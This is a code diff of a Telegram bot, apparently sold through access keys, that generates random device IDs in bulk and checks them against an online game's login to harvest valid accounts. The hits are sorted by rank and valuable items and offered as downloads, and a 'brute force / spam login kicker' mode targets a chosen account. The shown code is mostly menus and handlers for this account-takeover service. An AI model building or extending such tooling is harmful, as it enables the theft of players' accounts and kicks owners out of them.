-async def show_key_management(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
-    """Show key management menu"""
-    keyboard = [
-        [InlineKeyboardButton("📋 List All Keys", callback_data="keys_list")],
-        [InlineKeyboardButton("🔑 Generate New Key", callback_data="keys_generate")],
-        [InlineKeyboardButton("🗑️ Revoke Key", callback_data="keys_revoke")],
-        [InlineKeyboardButton("📊 Key Statistics", callback_data="keys_stats")],
-        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-    ]
-    
-    msg = "🔑 *Key Management*\n\nManage access keys for the bot."
-    
-    try:
-        if query:
-            await query.edit_message_text(
-                msg,
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        else:
-            await safe_reply(update, msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    except Exception as e:
-        logger.error(f"Error showing key management: {e}")
-
-# ─── Key Callback Handler ──────────────────────────────────────
-
-async def keys_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle key management callbacks"""
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = update.effective_user.id
-        if not is_admin(user_id):
-            await query.edit_message_text(
-                "❌ *Admin Only*\n\nThis feature is only available to administrators.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        data = query.data
-        
-        if data == "keys_generate":
-            keyboard = [
-                [InlineKeyboardButton("1 Day", callback_data="kg_1")],
-                [InlineKeyboardButton("7 Days", callback_data="kg_7")],
-                [InlineKeyboardButton("30 Days", callback_data="kg_30")],
-                [InlineKeyboardButton("90 Days", callback_data="kg_90")],
-                [InlineKeyboardButton("Custom", callback_data="kg_custom")],
-                [InlineKeyboardButton("🔙 Back", callback_data="keys_back")],
-            ]
-            await query.edit_message_text(
-                "🔑 *Generate New Key*\n\nSelect expiry period:",
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        
-        elif data.startswith("kg_"):
-            expiry_map = {"1": 1, "7": 7, "30": 30, "90": 90}
-            period = data.replace("kg_", "")
-            if period == "custom":
-                await query.edit_message_text(
-                    "📝 *Custom Expiry*\n\nEnter number of days:",
-                    parse_mode='Markdown'
-                )
-                context.user_data['state'] = KEY_MENU
-                return
-            
-            days = expiry_map.get(period, 7)
-            key_str = key_manager.generate_key(user_id, max_uses=10, expiry_days=days)
-            
-            if key_str:
-                await query.edit_message_text(
-                    f"✅ *Key Generated Successfully!*\n\n"
-                    f"🔑 Key: `{key_str}`\n"
-                    f"📅 Expires: {days} days\n"
-                    f"🔄 Max uses: 10\n"
-                    f"👤 Created by: {user_id}\n\n"
-                    f"Share this key with users to grant access.\n"
-                    f"User should use: `/redeem {key_str}`",
-                    parse_mode='Markdown'
-                )
-            else:
-                await query.edit_message_text(
-                    "❌ *Failed to Generate Key*\n\nYou have reached the maximum number of active keys.",
-                    parse_mode='Markdown'
-                )
-        
-        elif data == "keys_list":
-            keys = key_manager.list_keys(user_id)
-            if not keys:
-                await query.edit_message_text("📋 *No Keys Found*\n\nNo keys have been generated yet.", parse_mode='Markdown')
-                return
-            
-            page = context.user_data.get('key_page', 0)
-            page_size = 10
-            total_pages = (len(keys) + page_size - 1) // page_size
-            
-            if page >= total_pages:
-                page = 0
-            
-            start_idx = page * page_size
-            end_idx = min(start_idx + page_size, len(keys))
-            
-            text = f"📋 *Keys (Page {page + 1}/{total_pages})*\n\n"
-            for key in keys[start_idx:end_idx]:
-                status = "✅" if key.can_use() else "❌"
-                text += f"{status} `{key.key}`\n"
-                text += f"   Uses: {key.used_count}/{key.max_uses}\n"
-                text += f"   Expires: {key.expires_at[:10]}\n\n"
-            
-            keyboard = []
-            row = []
-            if page > 0:
-                row.append(InlineKeyboardButton("◀️ Previous", callback_data="key_prev"))
-            if page < total_pages - 1:
-                row.append(InlineKeyboardButton("Next ▶️", callback_data="key_next"))
-            row.append(InlineKeyboardButton("🔙 Back", callback_data="keys_back"))
-            keyboard.append(row)
-            
-            context.user_data['key_page'] = page
-            await query.edit_message_text(
-                text,
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        
-        elif data == "key_prev":
-            context.user_data['key_page'] = context.user_data.get('key_page', 0) - 1
-            await keys_callback(update, context)
-        
-        elif data == "key_next":
-            context.user_data['key_page'] = context.user_data.get('key_page', 0) + 1
-            await keys_callback(update, context)
-        
-        elif data == "keys_revoke":
-            await query.edit_message_text(
-                "🗑️ *Revoke Key*\n\nSend me the key to revoke:\n"
-                "Example: `DEVID_A1B2C3D4E5F6`\n\nType /cancel to cancel.",
-                parse_mode='Markdown'
-            )
-            context.user_data['state'] = AWAITING_KEY
-        
-        elif data == "keys_stats":
-            stats = key_manager.get_stats()
-            text = (
-                "📊 *Key Statistics*\n\n"
-                f"📌 Total Keys: {stats['total']}\n"
-                f"✅ Active Keys: {stats['active']}\n"
-                f"⏰ Expired Keys: {stats['expired']}\n"
-                f"🔒 Used Keys: {stats['used']}\n"
-                f"🔄 Total Uses: {stats['total_uses']}\n"
-            )
-            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="keys_back")]]
-            await query.edit_message_text(
-                text,
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        
-        elif data == "keys_back":
-            await show_key_management(update, context, query)
-    
-    except Exception as e:
-        logger.error(f"Error in keys_callback: {e}")
-
-# ─── Statistics ────────────────────────────────────────────────
-
-async def show_statistics(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
-    """Show bot statistics"""
-    try:
-        rank_counts = {}
-        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
-            rank_file = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank}"], f"{rank}_hits.txt")
-            if os.path.exists(rank_file):
-                with open(rank_file, 'r') as f:
-                    rank_counts[rank] = sum(1 for _ in f)
-            else:
-                rank_counts[rank] = 0
-        
-        v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
-        v2l_active = 0
-        if os.path.exists(v2l_file):
-            with open(v2l_file, 'r') as f:
-                v2l_active = sum(1 for _ in f)
-        
-        sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
-        sultan = 0
-        if os.path.exists(sultan_file):
-            with open(sultan_file, 'r') as f:
-                sultan = sum(1 for _ in f)
-        
-        total = sum(rank_counts.values())
-        
         text = (
-            "📊 *Bot Statistics*\n\n"
-            f"🏆 *Rank Distribution:*\n"
-            f"  Warrior: {rank_counts.get('warrior', 0):,}\n"
-            f"  Elite: {rank_counts.get('elite', 0):,}\n"
-            f"  Master: {rank_counts.get('master', 0):,}\n"
-            f"  Grandmaster: {rank_counts.get('gm', 0):,}\n"
-            f"  Epic: {rank_counts.get('epic', 0):,}\n"
-            f"  Legend: {rank_counts.get('legend', 0):,}\n"
-            f"  Mythic: {rank_counts.get('mythic', 0):,}\n"
-            f"\n📌 *Total Valid Accounts:* {total:,}\n"
-            f"🟢 *V2L Active:* {v2l_active:,}\n"
-            f"👑 *Sultan Accounts:* {sultan:,}\n"
+            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"═══════════════════════════\n"
+            f"👋 Welcome back, <b>Admin</b>!\n"
+            f"🆔 ID: <code>{user_id}</code>\n"
+            f"👤 Name: {username}\n"
+            f"♾️ Access: <b>Lifetime (Admin)</b>\n"
+            f"═══════════════════════════\n"
+            f"Choose an option below 👇"
         )
-        
-        if query:
-            await query.edit_message_text(text, parse_mode='Markdown')
-        else:
-            await safe_reply(update, text, parse_mode='Markdown')
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+    elif valid:
+        expiry = get_user_expiry_info(user_id)
+        used_count, limit = get_user_bf_usage_stats(user_id)
+        text = (
+            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"═══════════════════════════\n"
+            f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
+            f"🆔 ID: <code>{user_id}</code>\n"
+            f"═══════════════════════════\n"
+            f"📋 <b>Your Access:</b>\n{expiry}\n"
+            f"═══════════════════════════\n"
+            f"⚡ <b>BF Usage:</b> {used_count}/{limit}\n"
+            f"═══════════════════════════\n"
+            f"Choose an option below 👇"
+        )
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+    else:
+        text = (
+            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"═══════════════════════════\n"
+            f"👋 Hello, <b>{escape_html(username)}</b>!\n"
+            f"🆔 ID: <code>{user_id}</code>\n"
+            f"═══════════════════════════\n"
+            f"🔒 <b>ACCESS REQUIRED</b>\n\n"
+            f"This bot requires an access key.\n"
+            f"Use /redeem &lt;KEY&gt; to activate your access.\n\n"
+            f"📡 <b>Get a key from:</b> @ZyronDevv\n"
+            f"═══════════════════════════\n"
+            f"✨ Created by: @ZyronDevv"
+        )
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+
+async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+    username = user.username or user.first_name or "Unknown"
     
-    except Exception as e:
-        logger.error(f"Error in show_statistics: {e}")
-
-# ─── Bulk Check ────────────────────────────────────────────────
-
-async def start_bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE, query=None):
-    """Start bulk check process"""
-    devices = context.user_data.get('bulk_devices', [])
-    if not devices:
-        await query.edit_message_text("❌ *No devices found*", parse_mode='Markdown')
+    if not context.args:
+        await update.message.reply_text(
+            "🔑 <b>Key Redemption</b>\n\n"
+            "Usage: <code>/redeem YOUR-KEY-HERE</code>\n\n"
+            "Get a key from @ZyronDevv",
+            parse_mode=ParseMode.HTML
+        )
         return
     
-    total = len(devices)
-    keyboard = [
-        [InlineKeyboardButton("▶️ Start Check", callback_data="bulk_start")],
-        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-    ]
+    key_code = context.args[0].strip().upper()
+    success, msg = redeem_key(key_code, user_id, username)
+    
+    if success:
+        expiry = get_user_expiry_info(user_id)
+        text = (
+            f"✅ <b>ACCESS ACTIVATED!</b>\n"
+            f"═══════════════════════════\n"
+            f"🎉 Congratulations, <b>{escape_html(username)}</b>!\n"
+            f"Your access has been activated.\n\n"
+            f"{expiry}\n"
+            f"═══════════════════════════\n"
+            f"Type /start to access the bot menu."
+        )
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+    else:
+        await update.message.reply_text(f"❌ <b>Redemption Failed</b>\n\n{msg}", parse_mode=ParseMode.HTML)
+
+async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    valid, _ = is_user_authorized(user_id)
     
     text = (
-        f"📊 *Bulk Check Ready*\n\n"
-        f"📌 Devices to check: {total:,}\n"
-        f"⚡ Threads: 50\n\n"
-        f"⚠️ This may take several minutes.\n"
-        f"Results will be automatically saved to folders.\n\n"
-        f"Click 'Start Check' to begin."
+        "ℹ️ <b>HELP & COMMANDS</b>\n"
+        "═══════════════════════════\n\n"
+        "<b>Commands:</b>\n"
+        "• /start - Show main menu\n"
+        "• /redeem KEY - Activate access key\n"
+        "• /cancel - Cancel current operation\n"
+        "• /help - Show this help\n"
+        "• /mykey - View your access info\n\n"
+        "<b>Features:</b>\n"
+        "🔨 Generate Devices - Create random device IDs\n"
+        "🔍 Single Check - Check one device \n"
+        "📂 Bulk Check - Upload .txt file to check many\n"
+        "⚡ Brute Force - Spam login kicker\n"
+        "📊 Statistics - View hit counters\n"
+        "📁 My Files - Download result files\n"
+        "👤 My Profile - View your access info\n\n"
+        "═══════════════════════════\n"
+        "✨ Created by: @ZyronDevv"
     )
     
-    try:
-        if query:
-            await query.edit_message_text(
-                text,
-                reply_markup=InlineKeyboardMarkup(keyboard),
-                parse_mode='Markdown'
-            )
-        else:
-            await safe_reply(update, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-    except Exception as e:
-        logger.error(f"Error in start_bulk_check: {e}")
+    if valid or is_admin(user_id):
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+    else:
+        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
-async def start_bulk_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle bulk check start callback"""
-    try:
-        query = update.callback_query
-        await query.answer()
+async def cmd_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    expiry = get_user_expiry_info(user_id)
+    used_count, limit = get_user_bf_usage_stats(user_id)
+    await update.message.reply_text(
+        f"👤 <b>YOUR ACCESS INFO</b>\n"
+        f"═══════════════════════════\n"
+        f"🆔 User ID: <code>{user_id}</code>\n"
+        f"{expiry}\n"
+        f"═══════════════════════════\n"
+        f"⚡ <b>Brute Force Usage:</b>\n"
+        f"  📊 Used: {used_count}/{limit}\n"
+        f"  💡 Each device can only be used once\n"
+        f"  ♻️ Usage is refunded if you cancel/stop\n"
+        f"═══════════════════════════",
+        parse_mode=ParseMode.HTML
+    )
+
+async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["waiting_for_single_check"] = False
+    context.user_data["waiting_for_bruteforce"] = False
+    context.user_data["bf_stop_flag"] = True
+    context.user_data.pop("admin_bf_action", None)
+    context.user_data.pop("bf_target_user_id", None)
+    context.user_data.pop("admin_conv_state", None)
+    context.user_data.pop("bf_custom_stage", None)
+    
+    user_id = update.effective_user.id
+    device_id = context.user_data.get("bf_device", "")
+    
+    # ─── REFUND BF USAGE IF CANCELLED ───
+    refunded = False
+    if device_id and not is_admin(user_id):
+        if refund_user_bf_device(user_id, device_id):
+            refunded = True
+    
+    session_key = f"{user_id}_{device_id}"
+    with bf_sessions_lock:
+        if session_key in active_bf_sessions:
+            active_bf_sessions[session_key]["stop"] = True
+            active_bf_sessions[session_key]["refunded"] = True
+    
+    # Mark context so run_spam_kick knows not to commit on finish
+    context.user_data["bf_refunded"] = True
+    
+    msg = "❌ Operation cancelled."
+    if refunded:
+        msg += "\n♻️ Brute force usage refunded (+1 remaining)."
+    
+    await update.message.reply_text(msg, reply_markup=main_menu_keyboard())
+    return ConversationHandler.END
+
+# ────────────────────────────────────────────────────────────────
+# 13. CALLBACK HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user_id = update.effective_user.id
+    
+    valid, _ = is_user_authorized(user_id)
+    if not valid and not is_admin(user_id):
+        await query.answer("🔒 Access required! Use /redeem KEY", show_alert=True)
+        return
+    
+    if data == "main_menu":
+        await show_main_menu(query, context)
+    elif data == "gen_menu":
+        await show_gen_menu(query, context)
+    elif data == "single_menu":
+        context.user_data["waiting_for_single_check"] = True
+        context.user_data["waiting_for_bruteforce"] = False
+        context.user_data.pop("admin_bf_action", None)
+        await show_single_menu(query, context)
+    elif data == "bulk_menu":
+        context.user_data["waiting_for_single_check"] = False
+        context.user_data["waiting_for_bruteforce"] = False
+        context.user_data.pop("admin_bf_action", None)
+        await show_bulk_menu(query, context)
+    elif data == "bf_menu":
+        context.user_data["waiting_for_bruteforce"] = True
+        context.user_data["waiting_for_single_check"] = False
+        context.user_data.pop("admin_bf_action", None)
+        await show_bf_menu(query, context)
+    elif data == "stats":
+        await show_stats(query, context)
+    elif data == "files":
+        await show_files(query, context)
+    elif data == "profile":
+        await show_profile(query, user_id, context)
+    elif data == "help":
+        await show_help(query, context)
+    elif data == "admin":
+        if is_admin(user_id):
+            context.user_data["waiting_for_single_check"] = False
+            context.user_data["waiting_for_bruteforce"] = False
+            context.user_data.pop("admin_bf_action", None)
+            await show_admin_panel(query, context)
+        else:
+            await query.answer("🔒 Admin only!", show_alert=True)
+    elif data.startswith("gen_start_"):
+        await handle_gen_callback(query, data, context)
+    elif data.startswith("bf_"):
+        await handle_bf_callback(query, data, context)
+    elif data.startswith("admin_"):
+        if is_admin(user_id):
+            await handle_admin_callback(query, data, context)
+        else:
+            await query.answer("🔒 Admin only!", show_alert=True)
+    elif data.startswith("download_"):
+        await handle_download(query, data, context)
+
+# ────────────────────────────────────────────────────────────────
+# 14. MENU DISPLAY FUNCTIONS
+# ────────────────────────────────────────────────────────────────
+
+async def show_main_menu(query, context):
+    user_id = query.from_user.id
+    username = query.from_user.username or query.from_user.first_name or "User"
+    
+    context.user_data["waiting_for_single_check"] = False
+    context.user_data["waiting_for_bruteforce"] = False
+    context.user_data.pop("admin_bf_action", None)
+    context.user_data.pop("admin_conv_state", None)
+    context.user_data.pop("bf_custom_stage", None)
+    
+    if is_admin(user_id):
+        text = (
+            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"═══════════════════════════\n"
+            f"👋 <b>Admin Panel</b>\n"
+            f"Choose an option below 👇"
+        )
+    else:
+        expiry = get_user_expiry_info(user_id)
+        used_count, limit = get_user_bf_usage_stats(user_id)
+        text = (
+            f"🤖 <b>PREMIUM DEVICE ID BOT V1.0</b>\n"
+            f"═══════════════════════════\n"
+            f"👋 Welcome, <b>{escape_html(username)}</b>!\n"
+            f"{expiry}\n"
+            f"⚡ BF: {used_count}/{limit}\n"
+            f"═══════════════════════════\n"
+            f"Choose an option below 👇"
+        )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+
+async def show_gen_menu(query, context):
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📦 5 MB", callback_data="gen_start_5"),
+         InlineKeyboardButton("📦 10 MB", callback_data="gen_start_10")],
+        [InlineKeyboardButton("📦 25 MB", callback_data="gen_start_25")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
+    ])
+    text = (
+        "🔨 <b>GENERATE DEVICE IDS</b>\n"
+        "═══════════════════════════\n"
+        "Select the size of device IDs to generate:\n\n"
+        "💡 <b>1 MB ≈ 13,000 devices</b>\n"
+        "💡 <b>10 MB ≈ 130,000 devices</b>"
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+
+async def show_single_menu(query, context):
+    text = (
+        "🔍 <b>SINGLE ACCOUNT CHECK </b>\n"
+        "═══════════════════════════\n"
+        "Send me a <b>Device ID</b> to check.\n\n"
+        "This will perform a full 8-request check:\n"
+        "• Login verification\n"
+        "• Ban status\n"
+        "• Player info (nickname, level)\n"
+        "• Rank (current & highest)\n"
+        "• Heroes & skins count\n"
+        "• V2L status\n"
+        "• Account creation date\n\n"
+        "Type /cancel to abort."
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML)
+
+async def show_bulk_menu(query, context):
+    text = (
+        "📂 <b>BULK CHECK (8-REQ FULL DETAIL)</b>\n"
+        "═══════════════════════════\n"
+        "📤 <b>Upload a .txt file</b> containing device IDs (one per line).\n\n"
+        "🔍 The bot will:\n"
+        "• Check each device with 8 requests\n"
+        "• Sort accounts by rank\n"
+        "• Detect V2L status\n"
+        "• Filter banned accounts\n"
+        "• Auto-upload result files when complete\n\n"
+        "Type /cancel to abort."
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML)
+
+async def show_bf_menu(query, context):
+    user_id = query.from_user.id
+    used_count, limit = get_user_bf_usage_stats(user_id)
+    remaining = limit - used_count if limit > 0 else "Unlimited"
+    
+    if limit > 0:
+        limit_text = f"🔢 Used: {used_count}/{limit} devices\n📊 Remaining: {remaining}"
+    else:
+        limit_text = "♾️ Unlimited (Admin override)"
+    
+    text = (
+        f"⚡ <b>BRUTE FORCE / SPAM LOGIN KICKER</b>\n"
+        f"═══════════════════════════\n"
+        f"{limit_text}\n"
+        f"═══════════════════════════\n"
+        f"Send me a <b>Device ID</b> to target.\n\n"
+        f"The bot will:\n"
+        f"1️⃣ Verify the device & fetch account profile\n"
+        f"2️⃣ Show you account details\n"
+        f"3️⃣ Let you choose kick mode\n\n"
+        f"Type /cancel to abort."
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML)
+
+# ────────────────────────────────────────────────────────────────
+# 15. STATS / FILES / PROFILE / HELP
+# ────────────────────────────────────────────────────────────────
+
+async def show_stats(query, context):
+    with COUNTER_LOCK:
+        lines = ["📊 <b>STATISTICS</b>", "═══════════════════════════", "<b>Rank Distribution:</b>"]
+        rank_emojis = {'warrior': '🥉', 'elite': '🥈', 'master': '🥇', 'gm': '⭐', 'epic': '💜', 'legend': '💠', 'mythic': '🔥'}
+        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
+            count = HIT_COUNTERS.get(rank, 0)
+            emoji = rank_emojis.get(rank, '•')
+            lines.append(f"  {emoji} {rank.capitalize():<12}: {count:,}")
         
-        devices = context.user_data.get('bulk_devices', [])
-        if not devices:
-            await query.edit_message_text("❌ *No devices to check*", parse_mode='Markdown')
-            return
+        lines.append(f"\n<b>V2L Status:</b>")
+        lines.append(f"  🟢 Active: {HIT_COUNTERS.get('v2l_active', 0):,}")
+        lines.append(f"  🔴 Inactive: {HIT_COUNTERS.get('v2l_inactive', 0):,}")
+        lines.append(f"\n<b>Special:</b>")
+        lines.append(f"  👑 Sultan: {HIT_COUNTERS.get('sultan', 0):,}")
+        lines.append(f"  🚫 Banned: {HIT_COUNTERS.get('banned', 0):,}")
+        
+        total = sum(HIT_COUNTERS.get(r, 0) for r in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic'])
+        if total > 0:
+            lines.append(f"\n✅ <b>Total Good Accounts:</b> {total:,}")
+        lines.append("═══════════════════════════")
+    
+    await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+async def show_files(query, context):
+    file_buttons = []
+    for name, path in FILES.items():
+        if os.path.exists(path) and os.path.getsize(path) > 0:
+            size = os.path.getsize(path)
+            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
+            file_buttons.append([InlineKeyboardButton(f"📄 {name} ({size_str})", callback_data=f"download_{name}")])
+    
+    for rank_name in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
+        rank_file = get_rank_file(rank_name)
+        if rank_file and os.path.exists(rank_file) and os.path.getsize(rank_file) > 0:
+            size = os.path.getsize(rank_file)
+            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
+            file_buttons.append([InlineKeyboardButton(f"🏆 {rank_name}_hits ({size_str})", callback_data=f"download_rank_{rank_name}")])
+    
+    for v2l_type in ['v2l_active', 'v2l_inactive']:
+        v2l_file = os.path.join(OUTPUT_DIR, FOLDERS[v2l_type], f"{v2l_type}.txt")
+        if os.path.exists(v2l_file) and os.path.getsize(v2l_file) > 0:
+            size = os.path.getsize(v2l_file)
+            size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
+            file_buttons.append([InlineKeyboardButton(f"🔐 {v2l_type} ({size_str})", callback_data=f"download_{v2l_type}")])
+    
+    sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
+    if os.path.exists(sultan_file) and os.path.getsize(sultan_file) > 0:
+        size = os.path.getsize(sultan_file)
+        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.2f} MB"
+        file_buttons.append([InlineKeyboardButton(f"👑 sultan ({size_str})", callback_data=f"download_sultan")])
+    
+    file_buttons.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
+    
+    if len(file_buttons) <= 1:
+        text = "📁 <b>My Files</b>\n═══════════════════════════\n\nNo files available yet.\nGenerate or check devices first!"
+    else:
+        text = "📁 <b>My Files</b>\n═══════════════════════════\n\nSelect a file to download:"
+    
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(file_buttons))
+
+async def handle_download(query, data, context):
+    file_key = data.replace("download_", "")
+    
+    if file_key.startswith("rank_"):
+        rank_name = file_key.replace("rank_", "")
+        file_path = get_rank_file(rank_name)
+    else:
+        file_path = FILES.get(file_key)
+        if not file_path:
+            special = {
+                "v2l_active": os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt"),
+                "v2l_inactive": os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt"),
+                "sultan": os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt"),
+            }
+            file_path = special.get(file_key)
+    
+    if not file_path or not os.path.exists(file_path):
+        await query.answer("❌ File not found!", show_alert=True)
+        return
+    
+    with open(file_path, 'rb') as f:
+        await context.bot.send_document(
+            chat_id=query.message.chat_id,
+            document=InputFile(f, filename=os.path.basename(file_path)),
+            caption=f"📄 {os.path.basename(file_path)}"
+        )
+    await query.answer("✅ File sent!")
+
+async def show_profile(query, user_id, context):
+    if is_admin(user_id):
+        text = (
+            f"👤 <b>MY PROFILE</b>\n"
+            f"═══════════════════════════\n"
+            f"🆔 User ID: <code>{user_id}</code>\n"
+            f"👤 Name: {escape_html(query.from_user.username or query.from_user.first_name)}\n"
+            f"👑 Role: <b>Admin</b>\n"
+            f"♾️ Access: <b>Lifetime</b>\n"
+            f"═══════════════════════════\n"
+            f"✨ Created by: @ZyronDevv"
+        )
+    else:
+        expiry = get_user_expiry_info(user_id)
+        used_count, limit = get_user_bf_usage_stats(user_id)
+        text = (
+            f"👤 <b>MY PROFILE</b>\n"
+            f"═══════════════════════════\n"
+            f"🆔 User ID: <code>{user_id}</code>\n"
+            f"👤 Name: {escape_html(query.from_user.username or query.from_user.first_name)}\n"
+            f"═══════════════════════════\n"
+            f"📋 <b>Access Info:</b>\n{expiry}\n"
+            f"═══════════════════════════\n"
+            f"⚡ <b>Brute Force Usage:</b>\n"
+            f"  📊 Used: {used_count}/{limit}\n"
+            f"  💡 Each device can only be used once\n"
+            f"  ♻️ Usage is refunded if you cancel/stop\n"
+            f"═══════════════════════════\n"
+            f"✨ Created by: @ZyronDevv"
+        )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+async def show_help(query, context):
+    text = (
+        "ℹ️ <b>HELP & COMMANDS</b>\n"
+        "═══════════════════════════\n\n"
+        "<b>Commands:</b>\n"
+        "• /start - Show main menu\n"
+        "• /redeem KEY - Activate access key\n"
+        "• /cancel - Cancel current operation\n"
+        "• /help - Show this help\n"
+        "• /mykey - View your access info\n\n"
+        "<b>Features:</b>\n"
+        "🔨 <b>Generate Devices</b> - Create random device IDs\n"
+        "🔍 <b>Single Check</b> - Check one device \n"
+        "📂 <b>Bulk Check</b> - Upload .txt file to check many\n"
+        "⚡ <b>Brute Force</b> - Spam login kicker\n"
+        "📊 <b>Statistics</b> - View hit counters\n"
+        "👤 <b>My Profile</b> - View your access info\n\n"
+        "═══════════════════════════\n"
+        "✨ Created by: @ZyronDevv"
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+# ────────────────────────────────────────────────────────────────
+# 16. GENERATOR HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def handle_gen_callback(query, data, context):
+    if data.startswith("gen_start_"):
+        size = float(data.split("_")[-1])
+        await query.edit_message_text(
+            f"⏳ <b>Generating {size} MB of device IDs...</b>\n"
+            f"Using 16 threads. Please wait...",
+            parse_mode=ParseMode.HTML
+        )
+        
+        result = [None]
+        def worker():
+            result[0] = run_generator(size, 16)
+        
+        t = threading.Thread(target=worker, daemon=True)
+        t.start()
+        
+        while t.is_alive():
+            await asyncio.sleep(1)
+        
+        target_lines, output_file = result[0]
+        file_size = os.path.getsize(output_file) / (1024*1024)
+        
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📥 Download File", callback_data="download_generated_devices")],
+            [InlineKeyboardButton("🔙 Back", callback_data="gen_menu")]
+        ])
+        await query.edit_message_text(
+            f"✅ <b>Generation Complete!</b>\n"
+            f"═══════════════════════════\n"
+            f"📦 Size: {file_size:.2f} MB\n"
+            f"📊 Devices: {target_lines:,}\n"
+            f"📁 File: generated_devices.txt",
+            parse_mode=ParseMode.HTML, reply_markup=kb
+        )
+
+# ────────────────────────────────────────────────────────────────
+# 17. BRUTE FORCE CALLBACK HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def handle_bf_callback(query, data, context):
+    user_id = query.from_user.id
+    
+    if data == "bf_stop":
+        device_id = context.user_data.get('bf_device', '')
+        session_key = f"{user_id}_{device_id}"
+        with bf_sessions_lock:
+            if session_key in active_bf_sessions:
+                active_bf_sessions[session_key]["stop"] = True
+                active_bf_sessions[session_key]["refunded"] = True
+        
+        context.user_data["bf_stop_flag"] = True
+        context.user_data["bf_refunded"] = True
+        
+        refund_msg = ""
+        if device_id and not is_admin(user_id):
+            if refund_user_bf_device(user_id, device_id):
+                refund_msg = "\n♻️ <b>Usage refunded (+1 remaining)</b>"
         
         await query.edit_message_text(
-            "⏳ *Starting bulk check...*\n"
-            f"📌 Total: {len(devices):,} devices\n\n"
-            "Results will be shown as they're found.",
-            parse_mode='Markdown'
+            f"🛑 <b>Stopping kick... Please wait.</b>{refund_msg}",
+            parse_mode=ParseMode.HTML
         )
-        
-        context.user_data['bulk_running'] = True
-        
-        chunk_size = 50
-        processed = 0
-        found = 0
-        
-        status_msg = await query.message.edit_text(
-            f"⏳ *Processing...*\n"
-            f"📌 Progress: 0/{len(devices)} devices\n"
-            f"✅ Found: 0 accounts",
-            parse_mode='Markdown'
-        )
-        
-        for i in range(0, len(devices), chunk_size):
-            if not context.user_data.get('bulk_running', True):
